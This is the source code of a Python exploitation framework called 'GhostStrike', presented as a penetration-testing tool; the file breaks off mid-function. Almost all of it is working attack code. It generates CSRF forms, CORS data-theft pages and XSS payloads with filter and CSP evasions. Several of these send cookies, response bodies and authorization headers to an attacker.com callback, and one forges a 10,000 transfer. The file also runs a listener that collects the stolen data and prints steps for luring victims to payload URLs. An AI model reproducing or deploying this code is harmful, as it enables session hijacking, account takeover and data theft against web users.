#!/usr/bin/env python3
"""
GhostStrike v2.0 - Advanced CSRF/CORS Exploitation Framework
Ghost Ops Security - Professional Penetration Testing Tool
Author: Ghost Ops Security Team
Version: 2.0.0

Enhanced with:
- CSRF token bypass techniques
- SameSite cookie bypasses  
- Referer/Origin header manipulation
- CORS misconfiguration exploitation
- XSS filter evasion
- CSP bypass techniques
- Advanced payload generation
"""

import argparse
import requests
import re
import json
import base64
import urllib.parse
from bs4 import BeautifulSoup
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import time
import os
import sys
from colorama import init, Fore, Style
import socket
from datetime import datetime
import hashlib
import random
import string
import ssl
import warnings
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
warnings.filterwarnings('ignore', category=InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Banner
BANNER = f"""
{Fore.CYAN}
   ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓  ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████ 
  ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀ 
 ▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███   
 ░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄ 
 ░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ ▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
{Fore.RED}
        CSRF/CORS Exploitation Framework v2.0 - Ghost Ops Security
        [+] Advanced CSRF Defense Bypasses
        [+] CORS Misconfiguration Hunter  
        [+] XSS Filter Evasion Engine
        [+] SameSite Cookie Bypasses
        [+] CSP Bypass Techniques
{Style.RESET_ALL}
"""

class Colors:
    """Color codes for terminal output"""
    SUCCESS = f"{Fore.GREEN}[+]{Style.RESET_ALL}"
    ERROR = f"{Fore.RED}[-]{Style.RESET_ALL}"
    INFO = f"{Fore.BLUE}[*]{Style.RESET_ALL}"
    WARNING = f"{Fore.YELLOW}[!]{Style.RESET_ALL}"
    PAYLOAD = f"{Fore.MAGENTA}[P]{Style.RESET_ALL}"
    VULN = f"{Fore.RED}[VULN]{Style.RESET_ALL}"
    BYPASS = f"{Fore.CYAN}[BYPASS]{Style.RESET_ALL}"

class XSSFilterEvasion:
    """XSS filter bypass and evasion techniques"""
    
    @staticmethod
    def generate_bypass_payloads():
        """Generate comprehensive XSS filter bypass payloads"""
        return {
            'casing_bypasses': [
                '<ScRiPt>alert(1)</ScRiPt>',
                '<sCrIpT>alert(1)</sCrIpT>',
                '<object data="JaVaScRiPt:alert(1)">',
                '<img src=x OnErRoR=alert(1)>',
                '<svg/onload=alert(1)>',
                '<SCRIPT SRC=//evil.com/xss.js></SCRIPT>',
                '<iMg SrC=x OnErRoR=alert(1)>',
                '<iFrAmE SrC=javascript:alert(1)>'
            ],
            
            'encoding_bypasses': [
                # Unicode encoding
                '<script>eval("\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029")</script>',
                '<script>eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29")</script>',
                # Octal encoding
                '<script>eval("\\141\\154\\145\\162\\164\\50\\61\\51")</script>',
                # Base64
                '<script>eval(atob("YWxlcnQoMSk="))</script>',
                # HTML entities
                '<script>alert&#40;1&#41;</script>',
                '<script>alert&lpar;1&rpar;</script>',
                # URL encoding
                '<script>eval(decodeURI("alert%281%29"))</script>',
                # String.fromCharCode
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>'
            ],
            
            'execution_sinks': [
                '<script>eval("alert(1)")</script>',
                '<script>setTimeout("alert(1)",0)</script>',
                '<script>setInterval("alert(1)",1000)</script>',
                '<script>Function("alert(1)")()</script>',
                '<script>[].constructor.constructor("alert(1)")()</script>',
                '<script>window["eval"]("alert(1)")</script>',
                '<script>window["\\x65\\x76\\x61\\x6c"]("alert(1)")</script>',
                '<script>this["eval"]("alert(1)")</script>'
            ],
            
            'event_handlers': [
                '<body onload=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video onloadstart=alert(1) src=x>',
                '<audio onloadstart=alert(1) src=x>',
                '<marquee onstart=alert(1)>',
                '<meter onmouseover=alert(1)>0</meter>'
            ],
            
            'no_script_bypasses': [
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<object data=javascript:alert(1)>',
                '<embed src=javascript:alert(1)>',
                '<svg/onload=alert(1)>',
                '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">CLICKME</maction></math>',
                '<table background="javascript:alert(1)">',
                '<a href="javascript:alert(1)">click</a>'
            ],
            
            'filter_bypass_techniques': [
                # Null bytes
                '<scri\x00pt>alert(1)</scri\x00pt>',
                # Comments
                '<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>',
                # Line breaks
                '<scr\nipt>alert(1)</scr\nipt>',
                # Tabs
                '<scr\tipt>alert(1)</scr\tipt>',
                # No spaces
                '<svg/onload=alert(1)>',
                '<img/src=x/onerror=alert(1)>',
                # Double encoding
                '%253Cscript%253Ealert(1)%253C%252Fscript%253E'
            ]
        }
    
    @staticmethod
    def generate_xss_to_csrf_payload(target_url, params, exfil_url="http://attacker.com"):
        """Generate XSS payload that performs CSRF attack"""
        return f"""<script>
// XSS to CSRF Attack Chain
(function(){{
    // Steal cookies first
    var cookies = document.cookie;
    new Image().src = '{exfil_url}/cookies?c=' + encodeURIComponent(cookies);
    
    // Perform CSRF attack
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '{target_url}', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.withCredentials = true;
    
    var params = {json.dumps(params)};
    var body = Object.keys(params).map(key => 
        encodeURIComponent(key) + '=' + encodeURIComponent(params[key])
    ).join('&');
    
    xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
            // Exfiltrate response
            fetch('{exfil_url}/response', {{
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({{
                    url: '{target_url}',
                    status: xhr.status,
                    response: xhr.responseText,
                    headers: xhr.getAllResponseHeaders()
                }})
            }});
        }}
    }};
    
    xhr.send(body);
}})();
</script>"""

class CSRFDefenseBypasses:
    """Advanced CSRF defense bypass techniques"""
    
    @staticmethod
    def generate_token_bypass_payloads(target_url, params):
        """Generate payloads to bypass CSRF token validation"""
        payloads = {}
        
        # 1. No token
        params_no_token = {k: v for k, v in params.items() if 'token' not in k.lower()}
        payloads['no_token'] = CSRFDefenseBypasses._create_form(target_url, params_no_token)
        
        # 2. Empty token
        params_empty = params.copy()
        params_empty['csrf_token'] = ''
        payloads['empty_token'] = CSRFDefenseBypasses._create_form(target_url, params_empty)
        
        # 3. Duplicate token
        params_dup = params.copy()
        params_dup['csrf_token'] = 'aaaaaaaa'
        payloads['duplicate_token'] = CSRFDefenseBypasses._create_form(target_url, params_dup)
        
        # 4. Token from another session
        params_other = params.copy()
        params_other['csrf_token'] = 'token_from_another_session'
        payloads['other_session_token'] = CSRFDefenseBypasses._create_form(target_url, params_other)
        
        # 5. Token parameter pollution
        payloads['parameter_pollution'] = f"""
<form action="{target_url}?csrf_token=valid_token" method="POST">
    <input name="csrf_token" value="invalid_token">
    {CSRFDefenseBypasses._params_to_inputs(params)}
</form>
<script>document.forms[0].submit();</script>"""
        
        return payloads
    
    @staticmethod
    def generate_samesite_bypasses(target_url, params):
        """Generate payloads to bypass SameSite cookie restrictions"""
        payloads = {}
        
        # 1. Top-level navigation (bypasses Lax)
        payloads['top_navigation'] = f"""
<script>
// Bypass SameSite=Lax with top-level navigation
window.location = '{target_url}';
</script>"""
        
        # 2. Window.open method
        payloads['window_open'] = f"""
<script>
var form = document.createElement('form');
form.method = 'POST';
form.action = '{target_url}';
form.target = '_blank';
{CSRFDefenseBypasses._params_to_js_inputs(params)}
document.body.appendChild(form);
form.submit();
</script>"""
        
        # 3. Method override for GET
        params_with_method = params.copy()
        params_with_method['_method'] = 'POST'
        payloads['method_override'] = f"""
<script>
// Some frameworks support _method parameter
window.location = '{target_url}?{urllib.parse.urlencode(params_with_method)}';
</script>"""
        
        # 4. 302 Redirect chain
        payloads['redirect_chain'] = f"""
<script>
// Redirect through attacker site to target
window.location = 'http://attacker.com/redirect?target={urllib.parse.quote(target_url)}';
</script>"""
        
        # 5. Chrome bug with downloads
        payloads['download_bypass'] = f"""
<a href="{target_url}" download>Download</a>
<script>
// Chrome sends cookies even with SameSite for downloads
document.querySelector('a').click();
</script>"""
        
        return payloads
    
    @staticmethod
    def generate_referer_bypasses(target_url, params):
        """Generate payloads to bypass Referer header validation"""
        payloads = {}
        
        # 1. No Referer via meta tag
        payloads['meta_no_referrer'] = f"""
<meta name="referrer" content="no-referrer">
<form action="{target_url}" method="POST">
    {CSRFDefenseBypasses._params_to_inputs(params)}
</form>
<script>document.forms[0].submit();</script>"""
        
        # 2. Data URL (no referer)
        form_html = f'<form action="{target_url}" method="POST">{CSRFDefenseBypasses._params_to_inputs(params)}</form><script>document.forms[0].submit();</script>'
        data_url = f"data:text/html;base64,{base64.b64encode(form_html.encode()).decode()}"
        payloads['data_url'] = f'<script>window.location="{data_url}";</script>'
        
        # 3. Blob URL
        payloads['blob_url'] = f"""
<script>
var html = '{form_html}';
var blob = new Blob([html], {{type: 'text/html'}});
window.location = URL.createObjectURL(blob);
</script>"""
        
        # 4. Sandboxed iframe
        payloads['sandboxed_iframe'] = f"""
<iframe sandbox="allow-forms allow-scripts" srcdoc='
    <form action="{target_url}" method="POST">
        {CSRFDefenseBypasses._params_to_inputs(params)}
    </form>
    <script>document.forms[0].submit();</script>
'></iframe>"""
        
        # 5. History manipulation
        payloads['history_manipulation'] = f"""
<script>
history.pushState(null, null, '{target_url}');
var form = document.createElement('form');
form.method = 'POST';
form.action = '{target_url}';
{CSRFDefenseBypasses._params_to_js_inputs(params)}
document.body.appendChild(form);
form.submit();
</script>"""
        
        return payloads
    
    @staticmethod
    def generate_origin_bypasses(target_url, params):
        """Generate payloads to bypass Origin header validation"""
        payloads = {}
        
        # 1. Null origin via sandboxed iframe
        payloads['null_origin'] = f"""
<iframe sandbox="allow-forms allow-scripts" srcdoc='
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "{target_url}", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.withCredentials = true;
    xhr.send("{urllib.parse.urlencode(params)}");
    </script>
'></iframe>"""
        
        # 2. Subdomain takeover scenario
        payloads['subdomain'] = f"""
<!-- If subdomain.target.com is vulnerable to takeover -->
<script>
// Host this on subdomain.target.com
var xhr = new XMLHttpRequest();
xhr.open('POST', '{target_url}', true);
xhr.withCredentials = true;
xhr.send('{urllib.parse.urlencode(params)}');
</script>"""
        
        return payloads
    
    @staticmethod
    def generate_content_type_bypasses(target_url, params):
        """Generate payloads with different Content-Type headers"""
        payloads = {}
        
        # 1. Text/plain
        payloads['text_plain'] = f"""
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '{target_url}', true);
xhr.setRequestHeader('Content-Type', 'text/plain');
xhr.withCredentials = true;
xhr.send('{urllib.parse.urlencode(params)}');
</script>"""
        
        # 2. Multipart without boundary
        payloads['multipart_no_boundary'] = f"""
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '{target_url}', true);
xhr.setRequestHeader('Content-Type', 'multipart/form-data');
xhr.withCredentials = true;
xhr.send('{urllib.parse.urlencode(params)}');
</script>"""
        
        # 3. JSON with wrong content type
        payloads['json_wrong_type'] = f"""
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '{target_url}', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send(JSON.stringify({json.dumps(params)}));
</script>"""
        
        return payloads
    
    @staticmethod
    def _create_form(url, params):
        """Helper to create basic form"""
        inputs = CSRFDefenseBypasses._params_to_inputs(params)
        return f"""
<form action="{url}" method="POST">
    {inputs}
</form>
<script>document.forms[0].submit();</script>"""
    
    @staticmethod
    def _params_to_inputs(params):
        """Convert params dict to HTML inputs"""
        return '\n    '.join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
    
    @staticmethod
    def _params_to_js_inputs(params):
        """Convert params dict to JavaScript input creation"""
        js = ""
        for key, value in params.items():
            js += f"""
var input_{key} = document.createElement('input');
input_{key}.type = 'hidden';
input_{key}.name = '{key}';
input_{key}.value = '{value}';
form.appendChild(input_{key});"""
        return js

class CORSMisconfigurationExploits:
    """Advanced CORS misconfiguration detection and exploitation"""
    
    @staticmethod
    def generate_cors_exploits(target_url, callback_url="http://attacker.com"):
        """Generate various CORS exploitation payloads"""
        payloads = {}
        
        # 1. Basic CORS data theft
        payloads['basic_cors'] = f"""
<!DOCTYPE html>
<html>
<body>
<script>
fetch('{target_url}', {{
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
}})
.then(response => response.text())
.then(data => {{
    // Exfiltrate the response
    fetch('{callback_url}/data', {{
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({{
            url: '{target_url}',
            data: data,
            cookies: document.cookie,
            timestamp: new Date().toISOString()
        }})
    }});
}})
.catch(error => {{
    fetch('{callback_url}/error?e=' + encodeURIComponent(error), {{
        mode: 'no-cors'
    }});
}});
</script>
</body>
</html>"""
        
        # 2. CORS with XHR
        payloads['xhr_cors'] = f"""
<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '{target_url}', true);
xhr.withCredentials = true;

xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        var img = new Image();
        img.src = '{callback_url}/xhr?status=' + xhr.status + '&data=' + btoa(xhr.responseText);
    }}
}};

xhr.send();
</script>
</body>
</html>"""
        
        # 3. CORS POST request
        payloads['cors_post'] = f"""
<!DOCTYPE html>
<html>
<body>
<script>
fetch('{target_url}', {{
    method: 'POST',
    mode: 'cors',
    credentials: 'include',
    headers: {{
        'Content-Type': 'application/json',
    }},
    body: JSON.stringify({{
        action: 'transfer',
        amount: 10000,
        to: 'attacker'
    }})
}})
.then(response => response.json())
.then(data => {{
    fetch('{callback_url}/post_result', {{
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    }});
}});
</script>
</body>
</html>"""
        
        # 4. CORS with custom headers
        payloads['custom_headers'] = f"""
<!DOCTYPE html>
<html>
<body>
<script>
// Try to read API key or authorization header from response
fetch('{target_url}', {{
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
}})
.then(response => {{
    // Try to access custom headers
    var apiKey = response.headers.get('X-API-Key');
    var auth = response.headers.get('Authorization');
    
    return response.text().then(body => {{
        return {{
            body: body,
            apiKey: apiKey,
            auth: auth,
            headers: [...response.headers.entries()]
        }};
    }});
}})
.then(data => {{
    fetch('{callback_url}/headers', {{
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    }});
}});
</script>
</body>
</html>"""
        
        # 5. CORS preflight bypass attempts
        payloads['preflight_bypass'] = f"""
<!DOCTYPE html>
<html>
<body>
<script>
// Try simple request to avoid preflight
var img = new Image();
img.src = '{target_url}?callback={callback_url}';

// Try form-based request (no preflight)
var form = document.createElement('form');
form.method = 'POST';
form.action = '{target_url}';
form.enctype = 'text/plain';
var input = document.createElement('input');
input.name = '{{"test":"data","ignore":"';
input.value = '"}}'
form.appendChild(input);
document.body.appendChild(form);
form.submit();
</script>
</body>
</html>"""
        
        return payloads

class CSPBypassTechniques:
    """Content Security Policy bypass techniques"""
    
    @staticmethod
    def generate_csp_bypasses(csp_header=""):
        """Generate CSP bypass payloads based on policy"""
        bypasses = []
        
        # 1. JSONP endpoints
        bypasses.append({
            'technique': 'JSONP Endpoint',
            'payload': '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
            'bypasses': "script-src 'self' accounts.google.com"
        })
        
        # 2. Angular/AngularJS
        bypasses.append({
            'technique': 'AngularJS',
            'payload': '<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>',
            'bypasses': "script-src 'self'"
        })
        
        # 3. Base tag injection
        bypasses.append({
            'technique': 'Base Tag',
            'payload': '<base href="http://attacker.com/">',
            'bypasses': 'Relative URLs in script-src'
        })
        
        # 4. Object/Embed
        bypasses.append({
            'technique': 'Object/Embed',
            'payload': '<object data="data:text/html,<script>alert(1)</script>">',
            'bypasses': 'Missing object-src directive'
        })
        
        # 5. Inline styles for scriptless attacks
        bypasses.append({
            'technique': 'CSS Injection',
            'payload': '<style>*{background: url("http://attacker.com/log?c=" + document.cookie)}</style>',
            'bypasses': "style-src 'unsafe-inline'"
        })
        
        # 6. Meta refresh
        bypasses.append({
            'technique': 'Meta Refresh',
            'payload': '<meta http-equiv="refresh" content="0;url=http://attacker.com">',
            'bypasses': 'No CSP on meta tags'
        })
        
        return bypasses

class AdvancedPayloadGenerator:
    """Generate advanced CSRF payloads with all bypass techniques"""
    
    def __init__(self, target_url, params, method="POST"):
        self.target_url = target_url
        self.params = params
        self.method = method
        self.csrf_bypasses = CSRFDefenseBypasses()
        self.cors_exploits = CORSMisconfigurationExploits()
        self.xss_evasion = XSSFilterEvasion()
        self.csp_bypasses = CSPBypassTechniques()
    
    def generate_all_payloads(self, callback_url="http://attacker.com"):
        """Generate comprehensive payload collection"""
        all_payloads = {}
        
        # Basic CSRF payloads
        all_payloads['basic'] = self._generate_basic_payloads()
        
        # Token bypass payloads
        all_payloads['token_bypasses'] = self.csrf_bypasses.generate_token_bypass_payloads(
            self.target_url, self.params
        )
        
        # SameSite bypasses
        all_payloads['samesite_bypasses'] = self.csrf_bypasses.generate_samesite_bypasses(
            self.target_url, self.params
        )
        
        # Referer bypasses
        all_payloads['referer_bypasses'] = self.csrf_bypasses.generate_referer_bypasses(
            self.target_url, self.params
        )
        
        # Origin bypasses
        all_payloads['origin_bypasses'] = self.csrf_bypasses.generate_origin_bypasses(
            self.target_url, self.params
        )
        
        # Content-Type bypasses
        all_payloads['content_type_bypasses'] = self.csrf_bypasses.generate_content_type_bypasses(
            self.target_url, self.params
        )
        
        # CORS exploits
        all_payloads['cors_exploits'] = self.cors_exploits.generate_cors_exploits(
            self.target_url, callback_url
        )
        
        # XSS to CSRF
        all_payloads['xss_to_csrf'] = self.xss_evasion.generate_xss_to_csrf_payload(
            self.target_url, self.params, callback_url
        )
        
        # XSS filter bypasses
        all_payloads['xss_bypasses'] = self.xss_evasion.generate_bypass_payloads()
        
        # CSP bypasses
        all_payloads['csp_bypasses'] = self.csp_bypasses.generate_csp_bypasses()
        
        return all_payloads
    
    def _generate_basic_payloads(self):
        """Generate basic CSRF attack payloads"""
        payloads = {}
        
        # Standard HTML form
        inputs = '\n    '.join([f'<input type="hidden" name="{k}" value="{v}">' 
                                for k, v in self.params.items()])
        
        payloads['html_form'] = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body onload="document.forms[0].submit()">
  <form action="{self.target_url}" method="{self.method}">
    {inputs}
  </form>
</body>
</html>"""
        
        # AJAX request
        payloads['ajax'] = f"""<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('{self.method}', '{self.target_url}', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send('{urllib.parse.urlencode(self.params)}');
</script>
</body>
</html>"""
        
        # Fetch API
        payloads['fetch'] = f"""<!DOCTYPE html>
<html>
<body>
<script>
fetch('{self.target_url}', {{
    method: '{self.method}',
    mode: 'no-cors',
    credentials: 'include',
    headers: {{
        'Content-Type': 'application/x-www-form-urlencoded',
    }},
    body: '{urllib.parse.urlencode(self.params)}'
}});
</script>
</body>
</html>"""
        
        # Multipart form
        boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters, k=16))
        multipart_body = ""
        for key, value in self.params.items():
            multipart_body += f'--{boundary}\\r\\n'
            multipart_body += f'Content-Disposition: form-data; name="{key}"\\r\\n\\r\\n'
            multipart_body += f'{value}\\r\\n'
        multipart_body += f'--{boundary}--\\r\\n'
        
        payloads['multipart'] = f"""<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('{self.method}', '{self.target_url}', true);
xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary={boundary}');
xhr.withCredentials = true;
xhr.send('{multipart_body}');
</script>
</body>
</html>"""
        
        # JSON payload
        payloads['json'] = f"""<!DOCTYPE html>
<html>
<body>
<script>
fetch('{self.target_url}', {{
    method: '{self.method}',
    mode: 'no-cors',
    credentials: 'include',
    headers: {{
        'Content-Type': 'application/json',
    }},
    body: JSON.stringify({json.dumps(self.params)})
}});
</script>
</body>
</html>"""
        
        # Iframe-based
        payloads['iframe'] = f"""<!DOCTYPE html>
<html>
<body>
  <iframe style="display:none" name="csrf-frame"></iframe>
  <form action="{self.target_url}" method="{self.method}" target="csrf-frame">
    {inputs}
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>"""
        
        return payloads
    
    def save_payloads(self, output_dir="ghoststrike_payloads"):
        """Save all generated payloads to files"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        all_payloads = self.generate_all_payloads()
        
        saved_files = []
        
        for category, payloads in all_payloads.items():
            if isinstance(payloads, dict):
                for name, payload in payloads.items():
                    if isinstance(payload, str):
                        filename = f"{output_dir}/ghoststrike_{category}_{name}_{timestamp}.html"
                        with open(filename, 'w') as f:
                            f.write(payload)
                        saved_files.append(filename)
                        print(f"{Colors.SUCCESS} Created: {filename}")
            elif isinstance(payloads, list):
                # Handle list payloads (like XSS bypasses)
                filename = f"{output_dir}/ghoststrike_{category}_{timestamp}.txt"
                with open(filename, 'w') as f:
                    for item in payloads:
                        if isinstance(item, dict):
                            f.write(f"\n{'-'*50}\n")
                            for k, v in item.items():
                                f.write(f"{k}: {v}\n")
                        else:
                            f.write(f"{item}\n")
                saved_files.append(filename)
                print(f"{Colors.SUCCESS} Created: {filename}")
        
        # Create index.html with all payloads
        self._create_index_file(output_dir, saved_files, timestamp)
        
        return saved_files
    
    def _create_index_file(self, output_dir, files, timestamp):
        """Create index.html with links to all payloads"""
        index_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>GhostStrike Payloads - {timestamp}</title>
    <style>
        body {{ font-family: monospace; background: #1a1a1a; color: #0f0; }}
        h1 {{ color: #f00; text-align: center; }}
        h2 {{ color: #0ff; }}
        a {{ color: #0f0; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
        .category {{ margin: 20px 0; padding: 10px; border: 1px solid #0f0; }}
        pre {{ background: #000; padding: 10px; overflow-x: auto; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>👻 GhostStrike CSRF/CORS Exploitation Payloads</h1>
        <p>Generated: {timestamp}</p>
        <p>Target: {self.target_url}</p>
        
        <div class="category">
            <h2>🎯 Attack Payloads</h2>
            <ul>
"""
        
        for file in files:
            basename = os.path.basename(file)
            index_content += f'                <li><a href="{basename}" target="_blank">{basename}</a></li>\n'
        
        index_content += f"""            </ul>
        </div>
        
        <div class="category">
            <h2>📋 Quick Test Commands</h2>
            <pre>
# Serve payloads
python3 -m http.server 80

# Start callback server
nc -lvnp 8888

# Monitor with tcpdump
sudo tcpdump -i any -A 'port 80 or port 8888'
            </pre>
        </div>
        
        <div class="category">
            <h2>🔥 Exploit Chain</h2>
            <ol>
                <li>Start callback server on attacker machine</li>
                <li>Serve this directory on web server</li>
                <li>Send victim to specific payload URL</li>
                <li>Monitor callback server for stolen data</li>
            </ol>
        </div>
    </div>
</body>
</html>"""
        
        index_path = f"{output_dir}/index.html"
        with open(index_path, 'w') as f:
            f.write(index_content)
        
        print(f"{Colors.SUCCESS} Created index: {index_path}")

class CallbackServer:
    """HTTP server to catch callbacks from exploits"""
    
    def __init__(self, port=8888):
        self.port = port
        self.captured_data = []
        self.server = None
        self.thread = None
        
    class RequestHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            """Suppress default logging"""
            pass
            
        def do_GET(self):
            """Handle GET callbacks"""
            self.server.captured_data.append({
                'method': 'GET',
                'path': self.path,
                'headers': dict(self.headers),
                'timestamp': datetime.now().isoformat()
            })
            
            print(f"{Colors.SUCCESS} Callback received: GET {self.path}")
            
            # Extract data from query parameters
            if '?' in self.path:
                query = urllib.parse.parse_qs(self.path.split('?')[1])
                for key, value in query.items():
                    print(f"  {Colors.INFO} {key}: {value[0][:100]}...")
                    
                    # Try base64 decode
                    if key in ['data', 'response', 'cookies']:
                        try:
                            decoded = base64.b64decode(value[0])
                            print(f"  {Colors.PAYLOAD} Decoded: {decoded[:200]}...")
                        except:
                            pass
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
            
        def do_POST(self):
            """Handle POST callbacks"""
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            self.server.captured_data.append({
                'method': 'POST',
                'path': self.path,
                'headers': dict(self.headers),
                'body': post_data.decode('utf-8', errors='ignore'),
                'timestamp': datetime.now().isoformat()
            })
            
            print(f"{Colors.SUCCESS} Callback received: POST {self.path}")
            
            # Try to parse JSON
            try:
                data = json.loads(post_data)
                print(f"{Colors.PAYLOAD} JSON Data:")
                for key, value in data.items():
                    print(f"  {key}: {str(value)[:200]}...")
            except:
                print(f"{Colors.INFO} Body: {post_data.decode('utf-8', errors='ignore')[:500]}...")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
            
        def do_OPTIONS(self):
            """Handle preflight CORS requests"""
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', '*')
            self.send_header('Access-Control-Allow-Credentials', 'true')
            self.end_headers()
    
    def start(self):
        """Start the callback server"""
        self.RequestHandler.captured_data = self.captured_data
        self.server = HTTPServer(('0.0.0.0', self.port), self.RequestHandler)
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"{Colors.SUCCESS} Callback server started on port {self.port}")
        print(f"{Colors.INFO} Listening on: http://{socket.gethostbyname(socket.gethostname())}:{self.port}")
        
    def stop(self):
        """Stop the callback server"""
        if self.server:
            self.server.shutdown()
            self.thread.join()
            print(f"{Colors.INFO} Callback server stopped")
            
    def get_captured_data(self):
        """Get all captured callback data"""
        return self.captured_data

class GhostStrike:
    """Main GhostStrike framework v2.0"""
    
    def __init__(self, target_url, cookies=None):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        
        if cookies:
            self.set_cookies(cookies)
        
        self.callback_server = None
        
    def set_cookies(self, cookies):
        """Set cookies for the session"""
        if isinstance(cookies, str):
            # Parse cookie string
            for cookie in cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    self.session.cookies.set(name, value)
        elif isinstance(cookies, dict):
            for name, value in cookies.items():
                self.session.cookies.set(name, value)
    
    def scan_target(self):
        """Scan target for CSRF vulnerabilities"""
        print(f"\n{Colors.INFO} Scanning target: {self.target_url}")
        print("=" * 60)
        
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            forms = soup.find_all('form')
            print(f"{Colors.INFO} Found {len(forms)} forms")
            
            vulnerable_forms = []
            
            for i, form in enumerate(forms):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': [],
                    'has_csrf_token': False,
                    'has_captcha': False
                }
                
                # Check inputs
                inputs = form.find_all(['input', 'textarea', 'select'])
                for inp in inputs:
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', 'text')
                    
                    if input_name:
                        form_data['inputs'].append({
                            'name': input_name,
                            'type': input_type,
                            'value': inp.get('value', ''),
                            'required': inp.get('required') is not None
                        })
                        
                        # Check for CSRF token
                        if any(keyword in input_name.lower() for keyword in ['csrf', 'token', 'authenticity', 'nonce']):
                            form_data['has_csrf_token'] = True
                        
                        # Check for CAPTCHA
                        if any(keyword in input_name.lower() for keyword in ['captcha', 'recaptcha']):
                            form_data['has_captcha'] = True
                
                # Build full URL
                if form_data['action']:
                    if form_data['action'].startswith('http'):
                        form_data['full_url'] = form_data['action']
                    else:
                        form_data['full_url'] = urllib.parse.urljoin(self.target_url, form_data['action'])
                else:
                    form_data['full_url'] = self.target_url
                
                # Check vulnerability
                if form_data['method'] == 'POST' and not form_data['has_csrf_token'] and not form_data['has_captcha']:
                    vulnerable_forms.append(form_data)
                    print(f"\n  {Colors.VULN} Form #{i+1} - Potentially vulnerable!")
                else:
                    print(f"\n  Form #{i+1}:")
                
                print(f"    URL: {form_data['full_url']}")
                print(f"    Method: {form_data['method']}")
